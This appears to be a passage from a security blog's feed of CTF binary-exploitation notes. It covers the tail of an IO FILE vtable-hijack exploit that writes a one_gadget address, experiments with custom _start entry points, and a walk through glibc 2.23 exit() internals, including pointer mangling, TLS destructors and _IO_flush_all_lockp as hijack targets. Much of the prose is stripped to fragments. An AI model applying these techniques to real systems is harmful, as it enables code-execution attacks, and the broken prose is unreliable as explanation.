class="number">0x58</span>+i))</span><br><span class="line">    s(p8(p64(onegadget)[i]))</span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> IO FILE </tag>
            
            <tag> Vtable Hijack </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>main(After main return)</title>
      <link href="/2023/04/02/main-return/"/>
      <url>/2023/04/02/main-return/</url>
      
        <content type="html"><![CDATA[<h1 id="mainreturn"><a href="#mainreturn" class="headerlink" title="mainreturn"></a>mainreturn</h1><p>printf</p><p></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line">    sleep(<span class="number">3</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;world&quot;</span>);</span><br><span class="line">    sleep(<span class="number">3</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>printfprintf6sIO FILEIOreturnsource code</p><p>ldld-linux-x86-64.solibcUnix-like<code>_start</code></p><p>_start__libc_start_main,  libc.so  main  main </p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">__libc_start_main (<span class="type">int</span> (*main) (<span class="type">int</span>, <span class="type">char</span> **, <span class="type">char</span> ** MAIN_AUXVEC_DECL),</span><br><span class="line">           <span class="type">int</span> argc, <span class="type">char</span> **argv,</span><br><span class="line">           __typeof (main) init,</span><br><span class="line">           <span class="type">void</span> (*fini) (<span class="type">void</span>),</span><br><span class="line">           <span class="type">void</span> (*rtld_fini) (<span class="type">void</span>), <span class="type">void</span> *stack_end)</span><br><span class="line">&#123;</span><br><span class="line">  init_cpu_features (&amp;_dl_x86_cpu_features);</span><br><span class="line">  <span class="keyword">return</span> generic_start_main (main, argc, argv, init, fini, rtld_fini,</span><br><span class="line">                 stack_end);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>generic_start_mainmainexit</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">  <span class="comment">/* Nothing fancy, just call the function.  */</span></span><br><span class="line">  result = main (argc, argv, __environ MAIN_AUXVEC_PARAM);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">exit</span> (result);</span><br></pre></td></tr></table></figure><h2 id="start-hacking"><a href="#start-hacking" class="headerlink" title="_start hacking"></a>_start hacking</h2><h3 id="Compiler"><a href="#Compiler" class="headerlink" title="Compiler"></a>Compiler</h3><p>Unix-like<code>_start</code></p><p></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">my_main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;This is a program without a main() function! printf&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>gcc -nostartfiles -e my_main -g -o test test.c </code></p><ul><li>-nostartfiles:Do not use the standard system startup files when linking. The standard system libraries are used normally, unless -nostdlib, -nolibc, or -nodefaultlibs is used.</li><li>-e:Specify that the program entry point is entry. The argument is interpreted by the linker; the GNU linker accepts either a symbol name or an address.</li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">grxer@grxer /m/h/S/c/p/io_file&gt; gcc -nostartfiles -e my_main -g -o test test.c</span><br><span class="line">grxer@grxer /m/h/S/c/p/io_file&gt; ./test</span><br><span class="line">fish: ./test terminated by signal <span class="title function_">SIGSEGV</span> <span class="params">(Address boundary error)</span></span><br></pre></td></tr></table></figure><p></p><p>gdbprintfret</p><p><img src="/2023/04/02/main-return/image-20230403005428232.png" alt="image-20230403005428232"></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">my_main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;This is a program without a main() function! printf&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">grxer@grxer /m/h/S/c/p/io_file&gt; gcc -nostartfiles -e my_main -g -o test test.c</span><br><span class="line">grxer@grxer /m/h/S/c/p/io_file&gt; ./test</span><br><span class="line">This is a program without a <span class="title function_">main</span><span class="params">()</span> function! <span class="built_in">puts</span></span><br><span class="line">fish: ./test terminated by signal <span class="title function_">SIGSEGV</span> <span class="params">(Address boundary error)</span></span><br></pre></td></tr></table></figure><p>putsputs</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">grxer@grxer /m/h/S/c/p/io_file&gt; objdump -d test</span><br><span class="line"></span><br><span class="line">test:     file format elf64-x86<span class="number">-64</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Disassembly of section .plt:</span><br><span class="line"></span><br><span class="line"><span class="number">0000000000400320</span> &lt;<span class="built_in">puts</span>@plt<span class="number">-0x10</span>&gt;:</span><br><span class="line">  <span class="number">400320</span>:    ff <span class="number">35</span> e2 <span class="number">0</span>c <span class="number">20</span> <span class="number">00</span>    pushq  <span class="number">0x200ce2</span>(%rip)        # <span class="number">601008</span> &lt;_GLOBAL_OFFSET_TABLE_+<span class="number">0x8</span>&gt;</span><br><span class="line">  <span class="number">400326</span>:    ff <span class="number">25</span> e4 <span class="number">0</span>c <span class="number">20</span> <span class="number">00</span>    jmpq   *<span class="number">0x200ce4</span>(%rip)        # <span class="number">601010</span> &lt;_GLOBAL_OFFSET_TABLE_+<span class="number">0x10</span>&gt;</span><br><span class="line">  <span class="number">40032</span>c:    <span class="number">0f</span> <span class="number">1f</span> <span class="number">40</span> <span class="number">00</span>          nopl   <span class="number">0x0</span>(%rax)</span><br><span class="line"></span><br><span class="line"><span class="number">0000000000400330</span> &lt;<span class="built_in">puts</span>@plt&gt;:</span><br><span class="line">  <span class="number">400330</span>:    ff <span class="number">25</span> e2 <span class="number">0</span>c <span class="number">20</span> <span class="number">00</span>    jmpq   *<span class="number">0x200ce2</span>(%rip)        # <span class="number">601018</span> &lt;_GLOBAL_OFFSET_TABLE_+<span class="number">0x18</span>&gt;</span><br><span class="line">  <span class="number">400336</span>:    <span class="number">68</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       pushq  $<span class="number">0x0</span></span><br><span class="line">  <span class="number">40033b</span>:    e9 e0 ff ff ff       jmpq   <span class="number">400320</span> &lt;<span class="built_in">puts</span>@plt<span class="number">-0x10</span>&gt;</span><br><span class="line"></span><br><span class="line">Disassembly of section .text:</span><br><span class="line"></span><br><span class="line"><span class="number">0000000000400340</span> &lt;my_main&gt;:</span><br><span class="line">  <span class="number">400340</span>:    <span class="number">55</span>                   push   %rbp</span><br><span class="line">  <span class="number">400341</span>:    <span class="number">48</span> <span class="number">89</span> e5             mov    %rsp,%rbp</span><br><span class="line">  <span class="number">400344</span>:    bf <span class="number">58</span> <span class="number">03</span> <span class="number">40</span> <span class="number">00</span>       mov    $<span class="number">0x400358</span>,%edi</span><br><span class="line">  <span class="number">400349</span>:    e8 e2 ff ff ff       callq  <span class="number">400330</span> &lt;<span class="built_in">puts</span>@plt&gt;</span><br><span class="line">  <span class="number">40034</span>e:    <span class="number">90</span>                   nop</span><br><span class="line">  <span class="number">40034f</span>:    <span class="number">5</span>d                   pop    %rbp</span><br><span class="line">  <span class="number">400350</span>:    c3                   retq   </span><br></pre></td></tr></table></figure><p>retq</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">my_main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;This is a program without a main() function! printf&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>returnexit</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">grxer@grxer /m/h/S/c/p/io_file&gt; gcc -nostartfiles -e my_main -g -o test test.c</span><br><span class="line">grxer@grxer /m/h/S/c/p/io_file&gt; ./test</span><br><span class="line">This is a program without a <span class="title function_">main</span><span class="params">()</span> function! <span class="built_in">printf</span></span><br></pre></td></tr></table></figure><p>printf</p><p>_start</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> _start() &#123;</span><br><span class="line">  <span class="type">int</span> ret = my_main();</span><br><span class="line">  <span class="built_in">exit</span>(ret); </span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">my_main</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;This is a program without a main() function!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//gcc -nostartfiles -g -o test test.c</span></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">grxer@grxer /m/h/S/c/p/io_file&gt; gcc -nostartfiles -g -o test test.c</span><br><span class="line">test.c: In function _start:</span><br><span class="line">test.c:<span class="number">4</span>:<span class="number">13</span>: warning: implicit declaration of function my_main [-Wimplicit-function-declaration]</span><br><span class="line">   <span class="type">int</span> ret = my_main();</span><br><span class="line">             ^</span><br><span class="line">grxer@grxer /m/h/S/c/p/io_file&gt; ./test</span><br><span class="line">This is a program without a <span class="title function_">main</span><span class="params">()</span> function!</span><br></pre></td></tr></table></figure><h3 id="ELF"><a href="#ELF" class="headerlink" title="ELF"></a>ELF</h3><p>ELF Header <code>Elf32_Addr      e_entry;            /*  */</code>hacking</p>]]></content>
      
      
      
        <tags>
            
            <tag> Exit </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Glibc exit() </title>
      <link href="/2023/04/02/exit/"/>
      <url>/2023/04/02/exit/</url>
      
        <content type="html"><![CDATA[<h2 id="Glibc2-23-exit-source-code-analysis"><a href="#Glibc2-23-exit-source-code-analysis" class="headerlink" title="Glibc2.23 exit() source code analysis"></a>Glibc2.23 exit() source code analysis</h2><p></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;grxer&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id=""><a href="#" class="headerlink" title=""></a></h2><p>stdlib&#x2F;exit.c</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">exit</span> <span class="params">(<span class="type">int</span> status)</span></span><br><span class="line">&#123;</span><br><span class="line">  __run_exit_handlers (status, &amp;__exit_funcs, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (<span class="built_in">exit</span>)</span><br></pre></td></tr></table></figure><p>__exit_funcs?</p><p><img src="/2023/04/02/exit/image-20230402194009243.png" alt="image-20230402194009243"></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">exit_function_list</span></span></span><br><span class="line"><span class="class">  &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">exit_function_list</span> *<span class="title">next</span>;</span><span class="comment">//</span></span><br><span class="line">    <span class="type">size_t</span> idx;<span class="comment">// fns </span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">exit_function</span> <span class="title">fns</span>[32];</span><span class="comment">//</span></span><br><span class="line">  &#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">exit_function</span></span></span><br><span class="line"><span class="class">  &#123;</span></span><br><span class="line">    <span class="comment">/* `flavour&#x27; should be of type of the `enum&#x27; above but since we need</span></span><br><span class="line"><span class="comment">       this element in an atomic operation we have to use `long int&#x27;.  */</span></span><br><span class="line">    <span class="type">long</span> <span class="type">int</span> flavor;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    flavor,</span></span><br><span class="line"><span class="comment">    &#123;ef_free, ef_us, ef_on, ef_at, ef_cxa&#125;</span></span><br><span class="line"><span class="comment">       - ef_free</span></span><br><span class="line"><span class="comment">       - ef_us, </span></span><br><span class="line"><span class="comment">       - ef_on, ef_at, ef_cxa , </span></span><br><span class="line"><span class="comment">       at</span></span><br><span class="line"><span class="comment">       on</span></span><br><span class="line"><span class="comment">       cxa</span></span><br><span class="line"><span class="comment">    */</span>    </span><br><span class="line">    <span class="class"><span class="keyword">union</span>//<span class="title">union</span></span></span><br><span class="line"><span class="class">      &#123;</span></span><br><span class="line">    <span class="type">void</span> (*at) (<span class="type">void</span>);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">      &#123;</span></span><br><span class="line">        <span class="type">void</span> (*fn) (<span class="type">int</span> status, <span class="type">void</span> *arg);</span><br><span class="line">        <span class="type">void</span> *arg;</span><br><span class="line">      &#125; on;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">      &#123;</span></span><br><span class="line">        <span class="type">void</span> (*fn) (<span class="type">void</span> *arg, <span class="type">int</span> status);</span><br><span class="line">        <span class="type">void</span> *arg;</span><br><span class="line">        <span class="type">void</span> *dso_handle;</span><br><span class="line">      &#125; cxa;</span><br><span class="line">      &#125; func;</span><br><span class="line">  &#125;;</span><br><span class="line"><span class="type">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">exit_function_list</span> <span class="title">initial</span>;</span>           <span class="comment">//initiallibc</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">exit_function_list</span> *__<span class="title">exit_funcs</span> =</span> &amp;initial; <span class="comment">//exit</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="run-exit-handlers"><a href="#run-exit-handlers" class="headerlink" title="__run_exit_handlers"></a>__run_exit_handlers</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">attribute_hidden</span><br><span class="line">__run_exit_handlers (<span class="type">int</span> status, <span class="keyword">struct</span> exit_function_list **listp,</span><br><span class="line">             <span class="type">bool</span> run_list_atexit)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* First, call the TLS destructors.  */</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> SHARED</span></span><br><span class="line">  <span class="keyword">if</span> (&amp;__call_tls_dtors != <span class="literal">NULL</span>)</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    __call_tls_dtors ();</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* We do it this way to handle recursive calls to exit () made by</span></span><br><span class="line"><span class="comment">     the functions registered with `atexit&#x27; and `on_exit&#x27;. We call</span></span><br><span class="line"><span class="comment">     everyone on the list and use the status value in the last</span></span><br><span class="line"><span class="comment">     exit (). */</span></span><br><span class="line">  <span class="keyword">while</span> (*listp != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="class"><span class="keyword">struct</span> <span class="title">exit_function_list</span> *<span class="title">cur</span> =</span> *listp;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">while</span> (cur-&gt;idx &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">exit_function</span> *<span class="title">const</span> <span class="title">f</span> =</span></span><br><span class="line">        &amp;cur-&gt;fns[--cur-&gt;idx];</span><br><span class="line">      <span class="keyword">switch</span> (f-&gt;flavor)</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="type">void</span> (*atfct) (<span class="type">void</span>);</span><br><span class="line">          <span class="type">void</span> (*onfct) (<span class="type">int</span> status, <span class="type">void</span> *arg);</span><br><span class="line">          <span class="type">void</span> (*cxafct) (<span class="type">void</span> *arg, <span class="type">int</span> status);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> ef_free:</span><br><span class="line">        <span class="keyword">case</span> ef_us:</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> ef_on:</span><br><span class="line">          onfct = f-&gt;func.on.fn;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">          PTR_DEMANGLE (onfct);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">          onfct (status, f-&gt;func.on.arg);</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> ef_at:</span><br><span class="line">          atfct = f-&gt;func.at;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">          PTR_DEMANGLE (atfct);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">          atfct ();</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> ef_cxa:</span><br><span class="line">          cxafct = f-&gt;func.cxa.fn;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">          PTR_DEMANGLE (cxafct);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">          cxafct (f-&gt;func.cxa.arg, status);</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">      *listp = cur-&gt;next;</span><br><span class="line">      <span class="keyword">if</span> (*listp != <span class="literal">NULL</span>)</span><br><span class="line">    <span class="comment">/* Don&#x27;t free the last element in the chain, this is the statically</span></span><br><span class="line"><span class="comment">       allocate element.  */</span></span><br><span class="line">    <span class="built_in">free</span> (cur);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (run_list_atexit)</span><br><span class="line">    RUN_HOOK (__libc_atexit, ());</span><br><span class="line"></span><br><span class="line">  _exit (status);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="call-tls-dtors"><a href="#call-tls-dtors" class="headerlink" title="__call_tls_dtors()"></a>__call_tls_dtors()</h4><p>stdlib&#x2F;cxa_thread_atexit_impl.c</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Call the destructors.  This is called either when a thread returns from the</span></span><br><span class="line"><span class="comment">   initial function or when the process exits via the exit function.  */</span></span><br><span class="line"><span class="type">void</span></span><br><span class="line">__call_tls_dtors (<span class="type">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">while</span> (tls_dtor_list)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="class"><span class="keyword">struct</span> <span class="title">dtor_list</span> *<span class="title">cur</span> =</span> tls_dtor_list;</span><br><span class="line">      dtor_func func = cur-&gt;func;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">      PTR_DEMANGLE (func);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">      tls_dtor_list = tls_dtor_list-&gt;next;</span><br><span class="line">      func (cur-&gt;obj);</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Ensure that the MAP dereference happens before</span></span><br><span class="line"><span class="comment">     l_tls_dtor_count decrement.  That way, we protect this access from a</span></span><br><span class="line"><span class="comment">     potential DSO unload in _dl_close_worker, which happens when</span></span><br><span class="line"><span class="comment">     l_tls_dtor_count is 0.  See CONCURRENCY NOTES for more detail.  */</span></span><br><span class="line">      atomic_fetch_add_release (&amp;cur-&gt;<span class="built_in">map</span>-&gt;l_tls_dtor_count, <span class="number">-1</span>);</span><br><span class="line">      <span class="built_in">free</span> (cur);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (__call_tls_dtors)</span><br></pre></td></tr></table></figure><p>exit</p><p><code>tls_dtor_list</code> <code>tls_dtor_list</code> </p><p>return</p><h4 id="while"><a href="#while" class="headerlink" title="while"></a>while</h4><p>__exit_funcs</p><p></p><p><img src="/2023/04/02/exit/image-20230402210547276.png" alt="image-20230402210547276"></p><p></p><p>PTR_DEMANGLE</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#  <span class="keyword">define</span> PTR_DEMANGLE(var)    asm (<span class="string">&quot;ror $2*&quot;</span> LP_SIZE <span class="string">&quot;+1, %0\n&quot;</span>      \</span></span><br><span class="line"><span class="meta">                     <span class="string">&quot;xor %%fs:%c2, %0&quot;</span>      \</span></span><br><span class="line"><span class="meta">                     : <span class="string">&quot;=r&quot;</span> (var)      \</span></span><br><span class="line"><span class="meta">                     : <span class="string">&quot;0&quot;</span> (var),      \</span></span><br><span class="line"><span class="meta">                       <span class="string">&quot;i&quot;</span> (offsetof (tcbhead_t,      \</span></span><br><span class="line"><span class="meta">                              pointer_guard)))</span></span><br></pre></td></tr></table></figure><p>keytcbhead_t 0x30tsl hijack0x28canary</p><p><img src="/2023/04/02/exit/image-20230402211644558.png" alt="image-20230402211644558"></p><p><img src="/2023/04/02/exit/image-20230402211610883.png" alt="image-20230402211610883"></p><p>ror</p><p><img src="/2023/04/02/exit/image-20230402211718281.png" alt="image-20230402211718281"></p><p>xor</p><p><img src="/2023/04/02/exit/image-20230402212201065.png" alt="image-20230402212201065"></p><h3 id="TODO"><a href="#TODO" class="headerlink" title="TODO"></a>TODO</h3><p>_dl_fini</p><h3 id="TODO-1"><a href="#TODO-1" class="headerlink" title="TODO"></a>TODO</h3><p>__exit_funcs</p><h3 id="RUN-HOOK-libc-atexit"><a href="#RUN-HOOK-libc-atexit" class="headerlink" title="RUN_HOOK (__libc_atexit, ())"></a>RUN_HOOK (__libc_atexit, ())</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">text_set_element(__libc_atexit, _IO_cleanup);</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_cleanup (<span class="type">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* We do *not* want locking.  Some threads might use streams but</span></span><br><span class="line"><span class="comment">     that is their problem, we flush them underneath them.  */</span></span><br><span class="line">  <span class="type">int</span> result = _IO_flush_all_lockp (<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* We currently don&#x27;t have a reliable mechanism for making sure that</span></span><br><span class="line"><span class="comment">     C++ static destructors are executed in the correct order.</span></span><br><span class="line"><span class="comment">     So it is possible that other static destructors might want to</span></span><br><span class="line"><span class="comment">     write to cout - and they&#x27;re supposed to be able to do so.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">     The following will make the standard streambufs be unbuffered,</span></span><br><span class="line"><span class="comment">     which forces any output from late destructors to be written out. */</span></span><br><span class="line">  _IO_unbuffer_all ();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="IO-flush-all-lockp-o"><a href="#IO-flush-all-lockp-o" class="headerlink" title="_IO_flush_all_lockp(o)"></a>_IO_flush_all_lockp(o)</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> _IO_flush_all_lockp (<span class="type">int</span> do_lock)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> result = <span class="number">0</span>;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *<span class="title">fp</span>;</span></span><br><span class="line">  <span class="type">int</span> last_stamp;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//  _IO_MTSAFE_IO  list_all_lock</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">  __libc_cleanup_region_start (do_lock, flush_cleanup, <span class="literal">NULL</span>);</span><br><span class="line">  <span class="keyword">if</span> (do_lock)</span><br><span class="line">    _IO_lock_lock (list_all_lock);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="comment">//  _IO_list_all </span></span><br><span class="line">  last_stamp = _IO_list_all_stamp;</span><br><span class="line">  fp = (_IO_FILE *) _IO_list_all;</span><br><span class="line">  <span class="keyword">while</span> (fp != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">// </span></span><br><span class="line">      run_fp = fp;</span><br><span class="line">      <span class="keyword">if</span> (do_lock)</span><br><span class="line">        _IO_flockfile (fp);</span><br><span class="line"></span><br><span class="line">      <span class="comment">// </span></span><br><span class="line">      <span class="keyword">if</span> (((fp-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined _LIBC || defined _GLIBCPP_USE_WCHAR_T</span></span><br><span class="line">           || (_IO_vtable_offset (fp) == <span class="number">0</span></span><br><span class="line">               &amp;&amp; fp-&gt;_mode &gt; <span class="number">0</span> &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr</span><br><span class="line">                                    &gt; fp-&gt;_wide_data-&gt;_IO_write_base))</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">           )</span><br><span class="line">          &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)</span><br><span class="line">        result = EOF;</span><br><span class="line"></span><br><span class="line">      <span class="comment">//  run_fp </span></span><br><span class="line">      <span class="keyword">if</span> (do_lock)</span><br><span class="line">        _IO_funlockfile (fp);</span><br><span class="line">      run_fp = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">      <span class="comment">//  _IO_list_all </span></span><br><span class="line">      <span class="keyword">if</span> (last_stamp != _IO_list_all_stamp)</span><br><span class="line">        &#123;</span><br><span class="line">          fp = (_IO_FILE *) _IO_list_all;</span><br><span class="line">          last_stamp = _IO_list_all_stamp;</span><br><span class="line">        &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        fp = fp-&gt;_chain; <span class="comment">// </span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//  _IO_MTSAFE_IO  list_all_lock</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">  <span class="keyword">if</span> (do_lock)</span><br><span class="line">    _IO_lock_unlock (list_all_lock);</span><br><span class="line">  __libc_cleanup_region_end (<span class="number">0</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> <code>0</code>  <code>EOF</code> <code>do_lock</code>  _IO_list_all  <code>_IO_MTSAFE_IO</code> </p><p>_IO_OVERFLOW</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_OVERFLOW(FP, CH) JUMP1 (__overflow, FP, CH)</span></span><br></pre></td></tr></table></figure><p>__overflow_IO_new_file_overflow_IO_FILE EOF(-1)</p><p>fwrite</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (ch == EOF)</span><br><span class="line">  <span class="keyword">return</span> _IO_do_write (f, f-&gt;_IO_write_base,</span><br><span class="line">     f-&gt;_IO_write_ptr - f-&gt;_IO_write_base);</span><br></pre></td></tr></table></figure><p><img src="/2023/04/02/exit/image-20230402224531539.png" alt="image-20230402224531539"></p><p><img src="/2023/04/02/exit/image-20230402224604948.png" alt="image-20230402224604948"></p><p><img src="/2023/04/02/exit/image-20230402224642501.png" alt="image-20230402224642501"></p><p>vtable__write<code>_IO_new_file_write</code></p><p>write</p><p><img src="/2023/04/02/exit/image-20230402230052468.png" alt="image-20230402230052468"></p><h4 id="IO-unbuffer-all"><a href="#IO-unbuffer-all" class="headerlink" title="_IO_unbuffer_all"></a>_IO_unbuffer_all</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line">_IO_unbuffer_all (<span class="type">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *<span class="title">fp</span>;</span></span><br><span class="line">  <span class="keyword">for</span> (fp = (_IO_FILE *) _IO_list_all; fp; fp = fp-&gt;_chain)</span><br><span 